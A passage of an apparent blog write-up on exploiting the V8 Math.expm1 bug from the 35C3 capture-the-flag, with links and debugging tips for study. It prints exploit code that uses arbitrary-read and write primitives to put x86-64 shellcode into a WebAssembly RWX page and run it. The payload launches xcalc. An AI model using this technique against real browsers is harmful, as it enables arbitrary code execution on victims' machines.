class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">6</span>,<span class="hljs-number">129</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">7</span>,<span class="hljs-number">145</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">6</span>,<span class="hljs-number">109</span>,<span class="hljs-number">101</span>,<span class="hljs-number">109</span>,<span class="hljs-number">111</span>,<span class="hljs-number">114</span>,<span class="hljs-number">121</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">109</span>,<span class="hljs-number">97</span>,<span class="hljs-number">105</span>,<span class="hljs-number">110</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">10</span>,<span class="hljs-number">138</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">132</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">65</span>,<span class="hljs-number">42</span>,<span class="hljs-number">11</span>]);
+<span class="hljs-keyword">var</span> wasmModule = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebAssembly</span>.<span class="hljs-title class_">Module</span>(wasmCode);
+<span class="hljs-keyword">var</span> wasmInstance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebAssembly</span>.<span class="hljs-title class_">Instance</span>(wasmModule);
+<span class="hljs-keyword">var</span> func = wasmInstance.<span class="hljs-property">exports</span>.<span class="hljs-property">main</span>;
+
+<span class="hljs-keyword">var</span> shellcode=[<span class="hljs-number">0x90909090</span>,<span class="hljs-number">0x90909090</span>,<span class="hljs-number">0x782fb848</span>,<span class="hljs-number">0x636c6163</span>,<span class="hljs-number">0x48500000</span>,<span class="hljs-number">0x73752fb8</span>,<span class="hljs-number">0x69622f72</span>,<span class="hljs-number">0x8948506e</span>,<span class="hljs-number">0xc03148e7</span>,<span class="hljs-number">0x89485750</span>,<span class="hljs-number">0xd23148e6</span>,<span class="hljs-number">0x3ac0c748</span>,<span class="hljs-number">0x50000030</span>,<span class="hljs-number">0x4944b848</span>,<span class="hljs-number">0x414c5053</span>,<span class="hljs-number">0x48503d59</span>,<span class="hljs-number">0x3148e289</span>,<span class="hljs-number">0x485250c0</span>,<span class="hljs-number">0xc748e289</span>,<span class="hljs-number">0x00003bc0</span>,<span class="hljs-number">0x050f00</span>];
+
+rwx = <span class="hljs-title function_">arb_read</span>(<span class="hljs-title function_">addrof</span>(wasmInstance).<span class="hljs-title function_">f2i</span>() +<span class="hljs-number">0x00e8n</span> -<span class="hljs-number">1n</span>);
+<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[+] Got the Address of RWX segment: &quot;</span> + rwx.<span class="hljs-title function_">hex</span>());
+<span class="hljs-title function_">shell_write</span>(rwx, shellcode);
+<span class="hljs-title function_">func</span>(); 
+</code></pre>
+<p>To get the follow files, you can visit <a href="https://github.com/tourpran/pwn-hub/tree/main/v8-exp/expm1-35C3">here</a>.</p>
+<h2 id="debugging-tools%3A" tabindex="-1"><a class="header-anchor" href="#debugging-tools%3A">Debugging Tools:</a></h2>
+<ul>
+<li>
+<p>The helper code for GDB can be found in <code>src/objects-printer.cc</code>.</p>
+</li>
+<li>
+<p>The node structure comprises a variety of methods, including:</p>
+<ul>
+<li><strong>Methods:</strong>
+<ul>
+<li><code>new</code>, <code>clone</code>, <code>isDead</code>, <code>kill</code>, etc.</li>
+</ul>
+</li>
+<li><strong>Variables:</strong>
+<ul>
+<li>Includes operation descriptions (e.g., <code>opcode</code> related) and properties.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>Use the following flags for additional insights:</p>
+<ul>
+<li><code>--trace-turbo</code>: Generates the Turbolizer graph.</li>
+<li><code>--trace-representation</code>: Provides feedback types and information about each optimization phase.</li>
+</ul>
+</li>
+</ul>
+<h2 id="useful-links%3A" tabindex="-1"><a class="header-anchor" href="#useful-links%3A">Useful Links:</a></h2>
+<ul>
+<li><a href="https://abiondo.me/2019/01/02/exploiting-math-expm1-v8">Exploiting Math.expm1 in V8</a></li>
+<li><a href="https://www.jaybosamiya.com/blog/2019/01/02/krautflare/">Krautflare: A Deep Dive</a></li>
+</ul>
+
+        </article>
+
+        <!-- Navigation -->
+        <nav class="mt-16 pt-8 border-t border-gray-700">
+            <div class="flex justify-between">
+                <a href="/posts" class="text-emerald-400 hover:text-emerald-300">All Posts →</a>
+                <a href="/" class="text-emerald-400 hover:text-emerald-300">Home</a>
+            </div>
+        </nav>
+    </div>
+</body>
+</html>
